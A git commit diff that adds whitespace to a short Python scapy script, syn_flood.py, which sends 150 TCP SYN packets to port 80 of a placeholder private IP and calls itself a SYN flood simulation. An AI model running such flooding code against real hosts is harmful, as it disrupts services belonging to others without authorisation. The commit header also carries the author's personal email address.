3e0384c87985142e15249396369117963505d685
meredith <dmzart921@gmail.com>
2025-03-22 10:30:57 +0200

    few refinements

--- eth0/syn_flood.py
+++ eth0/syn_flood.py
@@ -2,7 +2,9 @@ from scapy.all import *
 import time
 
 target_ip = "192.168.x.x"
+
 for i in range(150):
     send(IP(dst=target_ip)/TCP(dport=80, flags="S"), verbose=0)
     time.sleep(0.01)  # Small delay
+
 print("SYN flood simulation complete.")
